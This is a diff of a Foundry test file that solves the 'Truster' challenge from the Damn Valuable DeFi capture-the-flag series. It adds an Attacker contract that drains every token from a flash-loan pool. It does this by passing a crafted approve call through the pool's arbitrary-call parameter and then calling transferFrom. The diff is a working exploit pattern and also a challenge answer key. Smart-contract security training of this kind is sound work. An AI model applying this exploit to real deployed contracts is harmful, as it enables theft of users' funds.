@@ -5,12 +5,13 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
+import {ERC20} from "solmate/tokens/ERC20.sol";
 
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant TOKENS_IN_POOL = 1_000_000e18;
 
     DamnValuableToken public token;
@@ -51,7 +52,8 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        Attacker attacker = new Attacker();
+        attacker.attack(pool, token, recovery, TOKENS_IN_POOL);
     }
 
     /**
@@ -63,6 +65,26 @@ contract TrusterChallenge is Test {
 
         // All rescued funds sent to recovery account
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
-        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            TOKENS_IN_POOL,
+            "Not enough tokens in recovery account"
+        );
+    }
+}
+
+contract Attacker {
+    function attack(
+        TrusterLenderPool pool,
+        DamnValuableToken token,
+        address recovery,
+        uint256 amount
+    ) external {
+        bytes memory payload = abi.encodeCall(
+            ERC20.approve,
+            (address(this), amount)
+        );
+        pool.flashLoan(0, address(this), address(token), payload);
+        token.transferFrom(address(pool), recovery, amount);
     }
 }
